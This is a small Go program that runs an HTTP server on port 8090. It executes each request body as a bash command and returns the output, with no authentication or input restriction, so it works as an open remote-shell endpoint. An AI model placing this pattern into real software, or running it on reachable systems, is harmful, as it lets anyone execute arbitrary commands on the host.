package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
)

func main() {
	http.HandleFunc("/", Handler)
	err := http.ListenAndServe(":8090", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}

func Shellout(command string) (string, string, error) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command("bash", "-c", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	return stdout.String(), stderr.String(), err
}

func Handler(w http.ResponseWriter, req *http.Request) {
	b, err := io.ReadAll(req.Body)
	if err != nil {
		fmt.Printf("err %v", err)
		fmt.Fprint(w, err)
	}

	out, errout, err := Shellout(string(b))
	if err != nil {
		log.Printf("error: %v\n", err)
	}
	if errout != "" {
		fmt.Printf("stderr %v", errout)
		fmt.Fprint(w, errout)
	} else {
		fmt.Printf("stdout %v", out)
		fmt.Fprint(w, out)
	}
}
